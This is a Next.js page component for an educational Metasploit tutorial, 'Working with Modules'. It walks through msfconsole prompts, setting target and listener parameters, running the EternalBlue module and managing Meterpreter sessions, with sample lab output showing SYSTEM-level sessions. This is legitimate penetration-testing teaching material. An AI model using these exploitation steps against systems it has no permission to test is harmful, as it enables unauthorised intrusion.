"use client";

import { useState } from "react";
import Link from "next/link";

export default function WorkingWithModules() {
  const [activeSection, setActiveSection] = useState<string | null>("prompts");

  const sections = [
    { id: "prompts", title: "1. The 5 Prompts", icon: "📟" },
    { id: "parameters", title: "2. Setting Parameters", icon: "⚙️" },
    { id: "common", title: "3. Common Parameters", icon: "🔧" },
    { id: "global", title: "4. Global Variables (setg)", icon: "🌐" },
    { id: "run", title: "5. Running Modules", icon: "▶️" },
    { id: "sessions", title: "6. Sessions", icon: "🔗" },
  ];

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-[#e6edf3] font-mono">
      <div className="scanline"></div>
      
      <header className="border-b border-[#21262d] p-4 bg-[#161b22]">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div>
            <h1 className="text-xl font-bold text-[#00ff41]">Task 4: Working with Modules</h1>
            <p className="text-sm text-[#6e7681]">Mastering module parameters and session management</p>
          </div>
          <div className="flex gap-2">
            <Link href="/" className="px-4 py-2 bg-[#161b22] text-[#e6edf3] rounded hover:bg-[#21262d]">
              ← Main
            </Link>
            <Link href="/msfconsole" className="px-4 py-2 bg-[#161b22] text-[#e6edf3] rounded hover:bg-[#21262d]">
              ← Task 3
            </Link>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto p-4 md:p-8">
        {/* Quick Nav */}
        <div className="flex flex-wrap gap-2 mb-8">
          {sections.map(s => (
            <button
              key={s.id}
              onClick={() => setActiveSection(s.id)}
              className={`px-3 py-1 rounded text-sm ${
                activeSection === s.id 
                  ? "bg-[#00ff41] text-black" 
                  : "bg-[#161b22] text-[#6e7681] hover:text-[#e6edf3]"
              }`}
            >
              {s.icon} {s.title}
            </button>
          ))}
        </div>

        {/* Section 1: The 5 Prompts */}
        <section className="mb-8 p-6 border border-[#21262d] rounded bg-[#0d1117]">
          <h2 className="text-xl font-bold text-[#00ff41] mb-4">1. The 5 Prompts in Metasploit</h2>
          
          <div className="space-y-4 text-sm">
            <p className="text-[#e6edf3]">
              When working with Metasploit, you'll see 5 different prompts. Each has different capabilities:
            </p>

            <div className="space-y-3">
              <div className="p-3 bg-[#161b22] rounded border-l-4 border-[#6e7681]">
                <p className="text-xs text-[#6e7681] mb-1">1. Regular Command Prompt (Linux/AttackBox)</p>
                <code className="text-[#e6edf3]">root@ip-10-10-XX-XX:~#</code>
                <p className="text-xs text-[#6e7681] mt-1">Cannot use Metasploit commands here</p>
              </div>

              <div className="p-3 bg-[#161b22] rounded border-l-4 border-[#00ff41]">
                <p className="text-xs text-[#6e7681] mb-1">2. Metasploit Console Prompt</p>
                <code className="text-[#00ff41]">msf6 &gt;</code>
                <p className="text-xs text-[#6e7681] mt-1">No context set - use msfconsole commands here</p>
              </div>

              <div className="p-3 bg-[#161b22] rounded border-l-4 border-[#00b4d8]">
                <p className="text-xs text-[#6e7681] mb-1">3. Context Prompt (Module Selected)</p>
                <code className="text-[#00b4d8]">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;</code>
                <p className="text-xs text-[#6e7681] mt-1">Module context - set parameters, run exploits</p>
              </div>

              <div className="p-3 bg-[#161b22] rounded border-l-4 border-[#ff9500]">
                <p className="text-xs text-[#6e7681] mb-1">4. Meterpreter Prompt</p>
                <code className="text-[#ff9500]">meterpreter &gt;</code>
                <p className="text-xs text-[#6e7681] mt-1">Meterpreter agent loaded - use Meterpreter commands</p>
              </div>

              <div className="p-3 bg-[#161b22] rounded border-l-4 border-[#ff0055]">
                <p className="text-xs text-[#6e7681] mb-1">5. Target Shell Prompt</p>
                <code className="text-[#ff0055]">C:\Windows\system32&gt;</code>
                <p className="text-xs text-[#6e7681] mt-1">Commands run on target system</p>
              </div>
            </div>
          </div>
        </section>

        {/* Section 2: Setting Parameters */}
        <section className="mb-8 p-6 border border-[#21262d] rounded bg-[#0d1117]">
          <h2 className="text-xl font-bold text-[#00ff41] mb-4">2. Setting Parameters</h2>
          
          <div className="space-y-4 text-sm">
            <p className="text-[#e6edf3]">
              Use <code className="bg-[#161b22] px-2 py-1 rounded">set PARAMETER_NAME VALUE</code> to configure modules. Always check with <code className="bg-[#161b22] px-2 py-1 rounded">show options</code> first.
            </p>

            <div className="p-4 bg-[#161b22] rounded font-mono text-xs">
              <p className="text-[#00b4d8] mb-2">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.165.39</p>
              <p className="text-[#00ff41] mb-4">rhosts =&gt; 10.10.165.39</p>
              
              <p className="text-[#00b4d8] mb-2">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</p>
              <p className="text-[#6e7681] mb-2">Module options (exploit/windows/smb/ms17_010_eternalblue):</p>
              <p className="text-[#6e7681] mb-1">   Name           Current Setting  Required  Description</p>
              <p className="text-[#6e7681] mb-1">   ----           ---------------  --------  -----------</p>
              <p className="text-[#ff9500]">   RHOSTS         10.10.165.39     yes       The target host(s)...</p>
              <p className="text-[#00ff41]">   RPORT          445              yes       The target port (TCP)</p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
              <div className="p-3 bg-[#161b22] rounded">
                <code className="text-[#00ff41]">set RHOSTS 10.10.10.10</code>
                <p className="text-xs text-[#6e7681] mt-1">Set target IP</p>
              </div>
              <div className="p-3 bg-[#161b22] rounded">
                <code className="text-[#00ff41]">unset RHOSTS</code>
                <p className="text-xs text-[#6e7681] mt-1">Clear specific parameter</p>
              </div>
              <div className="p-3 bg-[#161b22] rounded">
                <code className="text-[#00ff41]">unset all</code>
                <p className="text-xs text-[#6e7681] mt-1">Clear all parameters</p>
              </div>
            </div>
          </div>
        </section>

        {/* Section 3: Common Parameters */}
        <section className="mb-8 p-6 border border-[#21262d] rounded bg-[#0d1117]">
          <h2 className="text-xl font-bold text-[#00ff41] mb-4">3. Common Parameters You'll Use</h2>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
            <div className="p-4 bg-[#161b22] rounded border-l-4 border-[#00b4d8]">
              <h3 className="font-bold text-[#00b4d8]">RHOSTS</h3>
              <p className="text-[#6e7681] text-xs">Remote Host</p>
              <p className="text-[#e6edf3] mt-2">Target IP address. Supports:</p>
              <ul className="text-xs text-[#6e7681] mt-1 space-y-1">
                <li>- Single IP: 10.10.10.10</li>
                <li>- CIDR: 10.10.10.0/24</li>
                <li>- Range: 10.10.10.1-10</li>
                <li>- File: file:/targets.txt</li>
              </ul>
            </div>

            <div className="p-4 bg-[#161b22] rounded border-l-4 border-[#00b4d8]">
              <h3 className="font-bold text-[#00b4d8]">RPORT</h3>
              <p className="text-[#6e7681] text-xs">Remote Port</p>
              <p className="text-[#e6edf3] mt-2">Port on target system where vulnerable app runs</p>
              <p className="text-xs text-[#ff9500] mt-2">Default: 445 (SMB)</p>
            </div>

            <div className="p-4 bg-[#161b22] rounded border-l-4 border-[#00ff41]">
              <h3 className="font-bold text-[#00ff41]">LHOST</h3>
              <p className="text-[#6e7681] text-xs">Local Host</p>
              <p className="text-[#e6edf3] mt-2">Your attacking machine IP (AttackBox/Kali)</p>
              <p className="text-xs text-[#ff9500] mt-2">Required for reverse shells</p>
            </div>

            <div className="p-4 bg-[#161b22] rounded border-l-4 border-[#00ff41]">
              <h3 className="font-bold text-[#00ff41]">LPORT</h3>
              <p className="text-[#6e7681] text-xs">Local Port</p>
              <p className="text-[#e6edf3] mt-2">Port for reverse shell to connect back</p>
              <p className="text-xs text-[#ff9500] mt-2">Default: 4444</p>
            </div>

            <div className="p-4 bg-[#161b22] rounded border-l-4 border-[#ff0055]">
              <h3 className="font-bold text-[#ff0055]">PAYLOAD</h3>
              <p className="text-[#6e7681] text-xs">Payload</p>
              <p className="text-[#e6edf3] mt-2">Code to run on target after exploitation</p>
              <p className="text-xs text-[#ff9500] mt-2">Use show payloads to list</p>
            </div>

            <div className="p-4 bg-[#161b22] rounded border-l-4 border-[#ff9500]">
              <h3 className="font-bold text-[#ff9500]">SESSION</h3>
              <p className="text-[#6e7681] text-xs">Session ID</p>
              <p className="text-[#e6edf3] mt-2">Connection ID for post-exploitation modules</p>
              <p className="text-xs text-[#ff9500] mt-2">Used with existing connections</p>
            </div>
          </div>
        </section>

        {/* Section 4: Global Variables */}
        <section className="mb-8 p-6 border border-[#21262d] rounded bg-[#0d1117]">
          <h2 className="text-xl font-bold text-[#00ff41] mb-4">4. Global Variables (setg)</h2>
          
          <div className="space-y-4 text-sm">
            <p className="text-[#e6edf3]">
              <code className="bg-[#161b22] px-2 py-1 rounded">setg</code> sets global variables that persist across modules. Use <code className="bg-[#161b22] px-2 py-1 rounded">unsetg</code> to clear.
            </p>

            <div className="p-4 bg-[#161b22] rounded font-mono text-xs">
              <p className="text-[#00b4d8] mb-2">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</p>
              <p className="text-[#ff9500] mb-2">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</p>
              <p className="text-[#00ff41] mb-2">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; setg rhosts 10.10.165.39</p>
              <p className="text-[#00ff41] mb-4">rhosts =&gt; 10.10.165.39</p>
              
              <p className="text-[#00ff41] mb-2">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back</p>
              <p className="text-[#00ff41] mb-2">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</p>
              <p className="text-[#00b4d8] mb-2">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</p>
              <p className="text-[#6e7681] mb-2">Module options (auxiliary/scanner/smb/smb_ms17_010):</p>
              <p className="text-[#ff9500]">   RHOSTS       10.10.165.39    yes       The target host(s)...</p>
            </div>

            <div className="p-3 bg-[#ff0055]/20 border border-[#ff0055] rounded">
              <p className="text-[#ff0055] text-xs">
                💡 setg is useful when scanning multiple hosts or running multiple modules against the same target
              </p>
            </div>
          </div>
        </section>

        {/* Section 5: Running Modules */}
        <section className="mb-8 p-6 border border-[#21262d] rounded bg-[#0d1117]">
          <h2 className="text-xl font-bold text-[#00ff41] mb-4">5. Running Modules</h2>
          
          <div className="space-y-4 text-sm">
            <p className="text-[#e6edf3]">
              Use <code className="bg-[#161b22] px-2 py-1 rounded">exploit</code> or <code className="bg-[#161b22] px-2 py-1 rounded">run</code> to execute the module. <code className="bg-[#161b22] px-2 py-1 rounded">run</code> is an alias for non-exploit modules.
            </p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-4 bg-[#161b22] rounded">
                <h3 className="font-bold text-[#00ff41] mb-2">Basic Execution</h3>
                <code className="text-xs text-[#00ff41] block">msf6 exploit(...) &gt; run</code>
                <p className="text-xs text-[#6e7681] mt-2">or</p>
                <code className="text-xs text-[#00ff41] block">msf6 exploit(...) &gt; exploit</code>
              </div>

              <div className="p-4 bg-[#161b22] rounded">
                <h3 className="font-bold text-[#00ff41] mb-2">Background Session</h3>
                <code className="text-xs text-[#00ff41] block">msf6 exploit(...) &gt; exploit -z</code>
                <p className="text-xs text-[#6e7681] mt-2">Immediately backgrounds session after opening</p>
              </div>
            </div>

            <div className="p-4 bg-[#161b22] rounded">
              <h3 className="font-bold text-[#ff9500] mb-2">Some modules support CHECK</h3>
              <p className="text-[#6e7681] text-xs">Check if target is vulnerable WITHOUT exploiting</p>
              <code className="text-xs text-[#00ff41] block mt-2">msf6 exploit(...) &gt; check</code>
            </div>
          </div>
        </section>

        {/* Section 6: Sessions */}
        <section className="mb-8 p-6 border border-[#21262d] rounded bg-[#0d1117]">
          <h2 className="text-xl font-bold text-[#00ff41] mb-4">6. Managing Sessions</h2>
          
          <div className="space-y-4 text-sm">
            <p className="text-[#e6edf3]">
              After successful exploitation, a session is created. Use sessions to manage connections.
            </p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-4 bg-[#161b22] rounded">
                <h3 className="font-bold text-[#00b4d8] mb-2">List Sessions</h3>
                <code className="text-xs text-[#00ff41] block">msf6 &gt; sessions</code>
              </div>

              <div className="p-4 bg-[#161b22] rounded">
                <h3 className="font-bold text-[#00b4d8] mb-2">Interact with Session</h3>
                <code className="text-xs text-[#00ff41] block">msf6 &gt; sessions -i 1</code>
              </div>

              <div className="p-4 bg-[#161b22] rounded">
                <h3 className="font-bold text-[#00b4d8] mb-2">Background Session</h3>
                <code className="text-xs text-[#00ff41] block">meterpreter &gt; background</code>
                <p className="text-xs text-[#6e7681] mt-1">or press Ctrl+Z</p>
              </div>

              <div className="p-4 bg-[#161b22] rounded">
                <h3 className="font-bold text-[#ff0055] mb-2">Kill Session</h3>
                <code className="text-xs text-[#00ff41] block">msf6 &gt; sessions -k 1</code>
              </div>
            </div>

            <div className="p-4 bg-[#161b22] rounded font-mono text-xs">
              <p className="text-[#6e7681] mb-2">msf6 &gt; sessions</p>
              <p className="text-[#6e7681] mb-2">Active sessions</p>
              <p className="text-[#6e7681] mb-2">===============</p>
              <p className="text-[#6e7681] mb-2">  Id  Name  Type                     Information</p>
              <p className="text-[#6e7681] mb-2">  --  ----  ----                     -----------</p>
              <p className="text-[#ff9500]">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC</p>
              <p className="text-[#00ff41]">  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-PC</p>
            </div>
          </div>
        </section>

        {/* Interactive Demo */}
        <section className="mb-8 p-6 border border-[#00ff41] rounded bg-[#0d1117]">
          <h2 className="text-xl font-bold text-[#00ff41] mb-4">Quick Reference Summary</h2>
          
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#00b4d8] font-bold">set</p>
              <p className="text-xs text-[#6e7681]">Set parameter</p>
            </div>
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#00b4d8] font-bold">unset</p>
              <p className="text-xs text-[#6e7681]">Clear parameter</p>
            </div>
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#00ff41] font-bold">setg</p>
              <p className="text-xs text-[#6e7681]">Set global</p>
            </div>
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#00ff41] font-bold">unsetg</p>
              <p className="text-xs text-[#6e7681]">Clear global</p>
            </div>
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#ff9500] font-bold">exploit/run</p>
              <p className="text-xs text-[#6e7681]">Execute module</p>
            </div>
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#ff0055] font-bold">sessions</p>
              <p className="text-xs text-[#6e7681]">List sessions</p>
            </div>
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#ff0055] font-bold">background</p>
              <p className="text-xs text-[#6e7681]">Bg session</p>
            </div>
            <div className="p-2 bg-[#161b22] rounded text-center">
              <p className="text-[#ff0055] font-bold">back</p>
              <p className="text-xs text-[#6e7681]">Exit context</p>
            </div>
          </div>
        </section>
      </main>

      <footer className="border-t border-[#21262d] p-4 text-center text-[#6e7681] text-sm">
        Metasploit Framework Educational Simulation - Task 4
      </footer>
    </div>
  );
}
